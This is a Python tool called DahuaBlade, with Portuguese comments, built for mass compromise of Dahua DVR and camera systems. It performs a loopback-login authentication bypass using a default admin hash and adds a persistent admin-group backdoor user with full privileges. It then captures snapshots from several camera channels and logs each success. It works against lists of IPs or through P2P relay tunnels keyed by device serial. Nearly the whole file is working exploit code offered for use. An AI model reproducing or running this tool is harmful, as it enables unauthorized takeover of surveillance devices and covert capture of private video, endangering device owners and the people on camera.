#!/usr/bin/env python3
"""
DahuaBlade - Dahua Mass User Manager + Tunnel Mode (dh-p2p) + Multi Snapshot
"""

import requests
from requests.auth import HTTPDigestAuth
import socket
import json
import struct
import sys
import hashlib
import argparse
import time
import os
import subprocess
import signal
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# ====================== CONFIGURAÇÕES ======================
DEFAULT_NEW_USER = "pdr"
DEFAULT_NEW_PASS = "Senha@2026"
DEFAULT_PORT = 80
DEFAULT_THREADS = 20
TIMEOUT = 8

# ====================== TUNNEL CONFIG ======================
DHP2P_PATH = "/root/dh-p2p/target/release/dh-p2p"      # ← Ajuste se necessário
MAX_SIMULTANEOUS_TUNNELS = 4
BASE_LOCAL_PORT = 8080
TUNNEL_TIMEOUT = 15

print_lock = threading.Lock()

def print_safe(message, end="\n"):
    with print_lock:
        print(message, end=end)
        sys.stdout.flush()

# ====================== FUNÇÕES DAHUA ======================

def dahua_gen2_md5_hash(dh_realm, username, password):
    to_hash = f"{username}:{dh_realm}:{password}"
    return hashlib.md5(to_hash.encode('utf-8')).hexdigest().upper()

def limpar_buffer(sock):
    try:
        sock.settimeout(0.1)
        while True:
            chunk = sock.recv(4096)
            if not chunk: break
    except:
        pass
    finally:
        sock.settimeout(TIMEOUT)

def enviar_comando(sock, query, session_id, timeout=12):
    limpar_buffer(sock)
    header_magic = struct.pack('>Q', 0x2000000044484950)
    json_bytes = json.dumps(query).encode('latin-1')
    cmd_id = query.get('id', 1)

    header_payload = struct.pack('<I', session_id) + struct.pack('<I', cmd_id) + \
                     struct.pack('<I', len(json_bytes)) + struct.pack('<I', 0) + \
                     struct.pack('<I', len(json_bytes)) + struct.pack('<I', 0)
    
    packet = header_magic + header_payload + json_bytes
    sock.sendall(packet)
    sock.settimeout(timeout)

    try:
        resp_header = b""
        while len(resp_header) < 32:
            chunk = sock.recv(32 - len(resp_header))
            if not chunk: break
            resp_header += chunk

        if len(resp_header) == 32:
            resp_len = struct.unpack('<I', resp_header[16:20])[0]
            resp_body = b""
            while len(resp_body) < resp_len:
                chunk = sock.recv(min(65536, resp_len - len(resp_body)))
                if not chunk: break
                resp_body += chunk

            try:
                return json.loads(resp_body.decode('latin-1'))
            except:
                resp_str = resp_body.decode('latin-1', errors='ignore')
                start = resp_str.find('{')
                end = resp_str.rfind('}')
                if start != -1 and end != -1 and end > start:
                    return json.loads(resp_str[start:end+1])
    except:
        pass
    return None

def conectar_dvr(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((host, port))

        first_login = {"method": "global.login", "params": {"userName": "admin", "password": "", "clientType": "Console", "loginType": "Direct"}, "id": 1, "session": 0}
        data = enviar_comando(sock, first_login, 0)

        if not data:
            sock.close()
            return None, None, None

        session_alvo = data.get("session")
        realm = data.get("params", {}).get("realm") or "Dahua"

        admin_hash = dahua_gen2_md5_hash(realm, "admin", "admin")

        bypass_login = {
            "method": "global.login",
            "params": {"userName": "admin", "ipAddr": "127.0.0.1", "loginType": "Loopback", "clientType": "Local",
                       "authorityType": "Default", "passwordType": "Default", "password": admin_hash},
            "id": 2, "session": session_alvo
        }

        data = enviar_comando(sock, bypass_login, session_alvo)

        if data and data.get("result"):
            return sock, data.get("session"), realm
        else:
            sock.close()
            return None, None, None
    except:
        return None, None, None

def adicionar_usuario_dvr(sock, session_alvo, username, password, realm):
    password_hash = dahua_gen2_md5_hash(realm, username, password)
    
    authority_list = ["Monitor", "Monitor_01", "Monitor_02", "Monitor_03", "Monitor_04", "Replay", "Replay_01",
                      "AuthUserMag", "AuthSysCfg", "AuthSysInfo", "AuthManuCtr", "AuthStoreCfg", "AuthEventCfg",
                      "AuthNetCfg", "AuthRmtDevice", "AuthSecurity", "AuthBackup", "AuthMaintence"]

    query = {
        "method": "userManager.addUser",
        "params": {"user": {"Name": username, "Password": password_hash, "Group": "admin",
                            "AuthorityList": authority_list, "Sharable": True, "Reserved": False,
                            "Type": "Normal", "MaxMonitorChannels": 0}},
        "id": 20, "session": session_alvo
    }

    data = enviar_comando(sock, query, session_alvo)
    return (data and data.get("result")), password_hash

# ====================== SNAPSHOT (COM SERIAL) ======================

def capturar_snapshot(host, port, username, password, canal, serial, output_dir="snapshots_tunel"):
    """Captura snapshot e salva com o serial do DVR"""
    try:
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)

        url = f"http://{host}:{port}/cgi-bin/snapshot.cgi?channel={canal}"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'image/jpeg',
            'Referer': f'http://{host}:{port}/',
        }

        response = requests.get(url, auth=HTTPDigestAuth(username, password), headers=headers, timeout=12, stream=True)
        content = response.content

        if response.status_code == 200 and content and len(content) > 5000 and content.startswith(b'\xff\xd8'):
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{output_dir}/{serial}_ch{canal}_{timestamp}.jpg"
            
            with open(filename, 'wb') as f:
                f.write(content)
            return True, filename, len(content)
    except:
        pass
    return False, None, 0

# ====================== TUNNEL MODE COM MULTI SNAPSHOT ======================

def criar_tunel_e_adicionar(serial, local_port, novo_user, nova_senha, tirar_snapshot=True, canais_snapshot=None):
    """Cria túnel, adiciona usuário e tira snapshots de múltiplos canais"""
    if canais_snapshot is None:
        canais_snapshot = [1, 2, 3, 4]

    tunlog = f"/tmp/dh-tun_{serial}_{local_port}.log"
    result = {"serial": serial, "status": False, "message": "", "snapshots": []}

    try:
        print_safe(f"[TUN] Iniciando túnel → {serial} (porta {local_port})")

        cmd = [DHP2P_PATH, serial, "-p", f"127.0.0.1:{local_port}:80", "--relay"]

        with open(tunlog, "w") as f:
            proc = subprocess.Popen(cmd, stdout=f, stderr=subprocess.STDOUT, preexec_fn=os.setsid)

        # Aguarda túnel
        ready = False
        for _ in range(TUNNEL_TIMEOUT * 10):
            if os.path.exists(tunlog):
                content = open(tunlog, 'r', encoding='utf-8', errors='ignore').read().lower()
                if any(x in content for x in ['ready', 'connect', 'relay', 'listening', 'success']):
                    ready = True
                    break
            time.sleep(0.15)

        if not ready:
            try: os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            except: pass
            print_safe(f"[TUN] ❌ {serial} - Túnel não subiu")
            return result

        print_safe(f"[TUN] ✅ Túnel OK → {serial}")
        time.sleep(2.0)

        # === CRIA USUÁRIO ===
        sock, session, realm = conectar_dvr("127.0.0.1", local_port)
        
        if sock:
            sucesso, _ = adicionar_usuario_dvr(sock, session, novo_user, nova_senha, realm)
            sock.close()
            
            if sucesso:
                result["status"] = True
                result["message"] = "Usuário criado"
                print_safe(f"[+] ✅ {serial} - Usuário criado com sucesso!")
                
                # ===== MULTI SNAPSHOT =====
                if tirar_snapshot:
                    print_safe(f"[TUN] 📸 Tirando snapshots dos canais {canais_snapshot} → {serial}")
                    time.sleep(2.0)
                    
                    for canal in canais_snapshot:
                        print_safe(f"[TUN] 📸 Canal {canal} → {serial}")
                        snapshot_ok, snapshot_path, snapshot_size = capturar_snapshot(
                            "127.0.0.1", 
                            local_port, 
                            novo_user, 
                            nova_senha, 
                            canal, 
                            serial=serial,          # ← Serial do DVR
                            output_dir="snapshots_tunel"
                        )
                        
                        if snapshot_ok:
                            result["snapshots"].append(snapshot_path)
                            print_safe(f"[+] 📸 {serial} - Canal {canal} OK ({snapshot_size:,} bytes)")
                        else:
                            print_safe(f"[!] 📸 {serial} - Canal {canal} falhou")
                        time.sleep(1.0)  # Delay entre canais
                        
            else:
                print_safe(f"[-] {serial} - Falha ao criar usuário")
        else:
            print_safe(f"[-] {serial} - Falha na conexão com túnel")

    except Exception as e:
        result["message"] = f"Erro: {str(e)[:80]}"
        print_safe(f"[ERRO] {serial} - {str(e)[:80]}")
    finally:
        # Fecha túnel
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        except:
            pass
        time.sleep(0.5)
        subprocess.run(["sudo", "fuser", "-k", f"{local_port}/tcp"], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    return result

def modo_massa_tunel(arquivo_seriais, novo_user, nova_senha, tirar_snapshot=True, canais_snapshot=None):
    if canais_snapshot is None:
        canais_snapshot = [1, 2, 3, 4]

    print_safe("\n" + "="*80)
    print_safe(" DAHUABLADE - MODO TUNNEL (dh-p2p) + MULTI SNAPSHOT")
    print_safe("="*80)
    
    if tirar_snapshot:
        print_safe(f"📸 Snapshot automático: Canais {canais_snapshot}")
        os.makedirs("snapshots_tunel", exist_ok=True)

    seriais = []
    with open(arquivo_seriais, 'r') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                seriais.append(line)

    print_safe(f"Total de seriais: {len(seriais)} | Túnel simultâneos: {MAX_SIMULTANEOUS_TUNNELS}\n")

    sucessos = []
    falhas = []
    total_snapshots = 0

    with ThreadPoolExecutor(max_workers=MAX_SIMULTANEOUS_TUNNELS) as executor:
        futures = []
        for i, serial in enumerate(seriais, 1):
            port = BASE_LOCAL_PORT + (i % 30)
            future = executor.submit(criar_tunel_e_adicionar, serial, port, novo_user, nova_senha, tirar_snapshot, canais_snapshot)
            futures.append(future)

        for future in as_completed(futures):
            res = future.result()
            if res["status"]:
                sucessos.append(res)
                total_snapshots += len(res.get("snapshots", []))
            else:
                falhas.append(res)

    print_safe("\n" + "="*70)
    print_safe(" RELATÓRIO FINAL - TUNNEL MODE + MULTI SNAPSHOT")
    print_safe("="*70)
    print_safe(f"✅ Sucessos (usuários): {len(sucessos)}")
    print_safe(f"📸 Snapshots capturados: {total_snapshots}")
    print_safe(f"❌ Falhas: {len(falhas)}")

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    
    if sucessos:
        with open(f"sucesso_tunel_{timestamp}.txt", 'w') as f:
            for s in sucessos:
                f.write(f"{s['serial']}\n")

    if total_snapshots > 0:
        with open(f"snapshots_tunel_{timestamp}.txt", 'w') as f:
            for res in sucessos:
                for snap in res.get("snapshots", []):
                    f.write(f"{res['serial']} -> {snap}\n")

# ====================== OUTROS MODOS ====================== 
# (Mantidos iguais - não alterados)

def processar_dvr_adicionar(host, port, novo_user, nova_senha, index, total):
    try:
        print_safe(f"[{index}/{total}] 🔄 {host}:{port}")
        sock, session, realm = conectar_dvr(host, port)
        if not sock:
            print_safe(f"[{index}/{total}] ❌ {host}:{port} - Falha")
            return {"host": host, "port": port, "status": False, "message": "Falha conexão"}

        sucesso, _ = adicionar_usuario_dvr(sock, session, novo_user, nova_senha, realm)
        sock.close()

        if sucesso:
            print_safe(f"[{index}/{total}] ✅ {host}:{port} - OK")
            return {"host": host, "port": port, "status": True, "message": "Usuário criado"}
        else:
            print_safe(f"[{index}/{total}] ⚠️ {host}:{port} - Falha")
            return {"host": host, "port": port, "status": False, "message": "Falha ao criar"}
    except:
        print_safe(f"[{index}/{total}] ❌ {host}:{port} - Erro")
        return {"host": host, "port": port, "status": False, "message": "Erro"}

def modo_massa_adicionar(arquivo_ips, porta_padrao, novo_user, nova_senha, num_threads):
    print_safe("\n" + "="*60)
    print_safe(" DAHUABLADE - MODO MASSA IP")
    print_safe("="*60)
    
    ips = []
    with open(arquivo_ips, 'r') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                ips.append(line)
    
    print_safe(f"Total de IPs: {len(ips)} | Threads: {num_threads}\n")
    
    sucessos = []
    falhas = []
    
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = []
        for i, ip in enumerate(ips, 1):
            future = executor.submit(processar_dvr_adicionar, ip, porta_padrao, novo_user, nova_senha, i, len(ips))
            futures.append(future)
        
        for future in as_completed(futures):
            res = future.result()
            if res["status"]:
                sucessos.append(res)
            else:
                falhas.append(res)
    
    print_safe("\n" + "="*60)
    print_safe(" RELATÓRIO FINAL - MODO IP")
    print_safe("="*60)
    print_safe(f"✅ Sucessos: {len(sucessos)}")
    print_safe(f"❌ Falhas: {len(falhas)}")
    
    if sucessos:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        with open(f"sucesso_ips_{timestamp}.txt", 'w') as f:
            for s in sucessos:
                f.write(f"{s['host']}:{s['port']}\n")

def modo_snapshot_massa(arquivo_credenciais, canal=1):
    print_safe("\n" + "="*60)
    print_safe(" DAHUABLADE - SNAPSHOT EM MASSA")
    print_safe("="*60)
    
    alvos = []
    with open(arquivo_credenciais, 'r') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                parts = line.split(':')
                if len(parts) >= 4:
                    alvos.append({
                        'host': parts[0],
                        'port': int(parts[1]),
                        'user': parts[2],
                        'pass': parts[3]
                    })
    
    print_safe(f"Total de alvos: {len(alvos)} | Canal: {canal}\n")
    
    sucessos = 0
    for i, alvo in enumerate(alvos, 1):
        print_safe(f"[{i}/{len(alvos)}] 📸 {alvo['host']}:{alvo['port']}")
        ok, path, size = capturar_snapshot(alvo['host'], alvo['port'], alvo['user'], alvo['pass'], canal, serial="IP_MODE")
        if ok:
            sucessos += 1
            print_safe(f"  ✅ {path} ({size} bytes)")
        else:
            print_safe(f"  ❌ Falha")
    
    print_safe(f"\n✅ Snapshots capturados: {sucessos}/{len(alvos)}")

# ====================== MAIN ======================

def main():
    parser = argparse.ArgumentParser(description='DahuaBlade - Mass User Manager + Tunnel + Multi Snapshot')
    parser.add_argument('-f', '--file', help='Arquivo com IPs (modo IP)')
    parser.add_argument('-s', '--seriais', help='Arquivo com seriais para Tunnel')
    parser.add_argument('-i', '--ip', help='IP único')
    parser.add_argument('-p', '--port', type=int, default=DEFAULT_PORT, help='Porta (default: 80)')
    parser.add_argument('-u', '--user', default=DEFAULT_NEW_USER, help=f'Usuário a criar (default: {DEFAULT_NEW_USER})')
    parser.add_argument('-P', '--password', default=DEFAULT_NEW_PASS, help=f'Senha (default: {DEFAULT_NEW_PASS})')
    parser.add_argument('-t', '--threads', type=int, default=DEFAULT_THREADS, help='Threads (default: 20)')
    
    parser.add_argument('--tunnel', action='store_true', help='Modo Tunnel dh-p2p')
    parser.add_argument('--snapshot', action='store_true', help='Modo Snapshot')
    parser.add_argument('--canal', type=int, default=1, help='Canal único para snapshot (modo snapshot massa)')
    parser.add_argument('--canais', type=str, default='1,2,3,4', help='Canais para snapshot no tunnel (ex: 1,2,3,4)')
    parser.add_argument('--no-snapshot', action='store_true', help='Desabilita snapshot no modo tunnel')
    parser.add_argument('--credenciais', help='Arquivo com credenciais para snapshot massa')

    args = parser.parse_args()

    print_safe("""
    ╔══════════════════════════════════════════════════════════╗
    ║              DAHUABLADE v2.3 - SERIAL NO NOME           ║
    ║           Dahua Mass User + Tunnel + Snapshots          ║
    ╚══════════════════════════════════════════════════════════╝
    """)

    if args.tunnel and args.seriais:
        tirar_snapshot = not args.no_snapshot
        try:
            canais = [int(x.strip()) for x in args.canais.split(',')]
        except:
            canais = [1, 2, 3, 4]
        
        modo_massa_tunel(args.seriais, args.user, args.password, tirar_snapshot, canais)
    
    elif args.snapshot and args.credenciais:
        modo_snapshot_massa(args.credenciais, args.canal)
    
    elif args.file and not args.tunnel:
        modo_massa_adicionar(args.file, args.port, args.user, args.password, args.threads)
    
    elif args.ip:
        print_safe(f"[*] Conectando em {args.ip}:{args.port}...")
        sock, session, realm = conectar_dvr(args.ip, args.port)
        if sock:
            sucesso, _ = adicionar_usuario_dvr(sock, session, args.user, args.password, realm)
            sock.close()
            if sucesso:
                print_safe(f"[+] ✅ Usuário '{args.user}' criado com sucesso em {args.ip}")
                if args.snapshot:
                    ok, path, size = capturar_snapshot(args.ip, args.port, args.user, args.password, args.canal, serial="MANUAL")
                    if ok:
                        print_safe(f"[+] 📸 Snapshot salvo: {path}")
                    else:
                        print_safe(f"[-] ❌ Falha no snapshot")
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
